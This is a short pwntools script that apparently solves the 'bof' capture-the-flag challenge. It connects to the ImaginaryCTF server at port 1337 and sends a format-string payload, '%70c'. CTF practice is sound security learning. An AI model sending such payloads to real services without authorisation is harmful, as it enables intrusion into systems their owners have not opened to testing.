from pwn import *

context.binary = elf = ELF("./bof")
#conn = elf.process()
conn = remote("bof.chal.imaginaryctf.org", 1337)

conn.clean()
conn.sendline("%70c")
conn.stream()
